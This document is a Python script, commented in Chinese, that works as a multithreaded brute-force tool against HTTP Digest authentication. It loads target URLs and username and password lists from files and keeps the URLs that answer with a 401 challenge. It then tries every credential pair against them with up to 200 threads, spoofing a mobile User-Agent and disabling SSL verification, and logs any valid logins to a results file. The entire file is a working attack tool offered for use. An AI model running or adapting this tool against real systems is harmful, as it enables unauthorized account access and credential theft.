import requests
from requests.auth import HTTPDigestAuth
from concurrent.futures import ThreadPoolExecutor
import ssl
import urllib3
import threading
import queue
from tqdm import tqdm
import argparse
import os

# 忽略SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 自定义User-Agent
USER_AGENT = "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"

# 创建一个队列来存储结果
result_queue = queue.Queue()

# 结果文件路径
result_file = "success_results.txt"

# 读取文件内容
def read_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"文件 {file_path} 未找到")
        return []

# 写入结果到文件（线程安全）
def write_result(result):
    with threading.Lock():  # 使用锁确保线程安全
        with open(result_file, 'a', encoding='utf-8') as f:
            f.write(result + '\n')

# 检查URL存活并验证状态码为401
def check_url_alive(url):
    try:
        headers = {'User-Agent': USER_AGENT}
        response = requests.get(url, headers=headers, verify=False, timeout=5)
        if response.status_code == 401:
            print(f"URL存活且需要Digest认证: {url}")
            return url
        else:
            print(f"URL {url} 返回状态码 {response.status_code}，跳过")
            return None
    except requests.RequestException as e:
        print(f"URL {url} 无法访问: {str(e)}")
        return None

# 尝试认证
def try_auth(url, username, password, progress_bar):
    try:
        headers = {'User-Agent': USER_AGENT}
        # 发送请求，忽略SSL验证
        response = requests.get(url, auth=HTTPDigestAuth(username, password),
                                headers=headers, verify=False, timeout=5)

        # 检查响应状态
        if response.status_code == 200:
            result = f"成功: {url} 用户名: {username} 密码: {password}"
            result_queue.put(result)
            print(result)
            write_result(result)  # 实时写入文件
            return True
        else:
            return False
    except requests.RequestException as e:
        print(f"请求 {url} 失败: {str(e)}")
        return False
    finally:
        progress_bar.update(1)  # 更新进度条

# 处理单个URL的爆破
def crack_url(url, usernames, passwords, progress_bar):
    for username in usernames:
        for password in passwords:
            if try_auth(url, username, password, progress_bar):
                return  # 找到匹配后退出当前URL的尝试

# 主函数
def main():
    # 解析命令行参数
    parser = argparse.ArgumentParser(description="HTTP Digest认证爆破工具")
    parser.add_argument('--threads', type=int, default=200, help="最大线程数 (默认: 10)")
    args = parser.parse_args()
    max_threads = args.threads

    # 读取文件
    urls = read_file('url.txt')
    usernames = read_file('user.txt')
    passwords = read_file('pass.txt')

    if not (urls and usernames and passwords):
        print("URL、用户名或密码列表为空，请检查文件")
        return

    # URL存活检测
    print("\n=== 开始URL存活检测 ===")
    alive_urls = []
    with ThreadPoolExecutor(max_threads) as executor:
        futures = [executor.submit(check_url_alive, url) for url in urls]
        for future in futures:
            result = future.result()
            if result:
                alive_urls.append(result)

    if not alive_urls:
        print("没有存活且需要Digest认证的URL，程序退出")
        with open(result_file, 'w', encoding='utf-8') as f:
            f.write("=== HTTP Digest认证爆破结果 ===\n没有存活且需要Digest认证的URL\n")
        return

    # 清空或创建结果文件
    if os.path.exists(result_file):
        os.remove(result_file)
    with open(result_file, 'w', encoding='utf-8') as f:
        f.write("=== HTTP Digest认证爆破成功结果 ===\n")

    # 计算总任务数（用于进度条）
    total_tasks = len(alive_urls) * len(usernames) * len(passwords)

    # 创建共享的进度条
    print("\n=== 开始爆破 ===")
    with tqdm(total=total_tasks, desc="爆破进度", unit="尝试") as progress_bar:
        # 创建线程池
        with ThreadPoolExecutor(max_threads) as executor:
            # 提交任务
            futures = [executor.submit(crack_url, url, usernames, passwords, progress_bar) for url in alive_urls]

            # 等待所有任务完成
            for future in futures:
                future.result()

    # 打印所有成功结果
    print("\n=== 爆破结果 ===")
    if result_queue.empty():
        print("未找到有效凭据")
        with open(result_file, 'a', encoding='utf-8') as f:
            f.write("未找到有效凭据\n")
    else:
        while not result_queue.empty():
            print(result_queue.get())

if __name__ == "__main__":
    main()
